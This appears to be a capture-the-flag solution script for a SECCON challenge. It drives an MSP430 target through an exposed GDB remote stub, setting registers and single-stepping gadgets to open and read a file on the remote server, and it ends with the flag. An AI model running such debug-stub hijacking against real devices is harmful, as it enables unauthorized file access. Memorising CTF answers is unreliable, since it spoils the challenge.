#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
r = remote("micro.pwn.seccon.jp", 10000)

checksum = lambda data: sum([ord(c) for c in data]) % 0x100

def l2b(x):
    y = (x & 0x000000ff) << 24
    y |= (x & 0x0000ff00) << 8
    y |= (x & 0x00ff0000) >> 8
    y |= (x & 0xff000000) >> 24
    return y

def rsp(cmd):
    r.send("+$%s#%02x+" % (cmd, checksum(cmd)))
    data = r.recvuntil("#", drop=True)[2:]
    r.recv(2)
    return data

def get_regs():
    return ["%04X" % u32(x) for x in group(4, rsp("g").decode('hex'))]

def set_regs(regs):
    return rsp("G" + "".join("%08x" % l2b(x) for x in regs))

def read_mem(addr, size):
    return rsp("m%x,%02x" % (addr, size)).decode('hex')

def step():
    return rsp("s")

# MSP430
PC = 0
SP = 1
SR = 2
CG2 = 3
R4= 4
R5 = 5
R6 = 6
R7 = 7
R8 = 8
R9 = 9
R10 = 10
R11 = 11
R12 = 12
R13 = 13
R14 = 14
R15 = 15

log.info("write file name to 0x2400...")
for i,c in enumerate("word.txt"):
    regs = [0] * 16
    regs[PC] = 0x202E #  mov.b   R13, 1(SP)
    regs[SP] = 0x2400 - 1 + i
    regs[R13] = ord(c)
    set_regs(regs)
    step()

print hexdump(read_mem(0x2400, 9))

regs = [0] * 16

log.info("open")
regs[PC] = 0x201A
regs[SP] = 0
regs[R12] = 0x2400
set_regs(regs)
step()
print get_regs()

log.info("read")
regs[PC] = 0x200E
regs[SP] = 0
regs[R12] = 3
regs[R13] = 0x2400
regs[R14] = 100
set_regs(regs)
step()

print read_mem(0x2400, 100).rstrip("\x00")

import pdb
pdb.set_trace()
    
# SECCON{SOPIsStepOrientedProg}

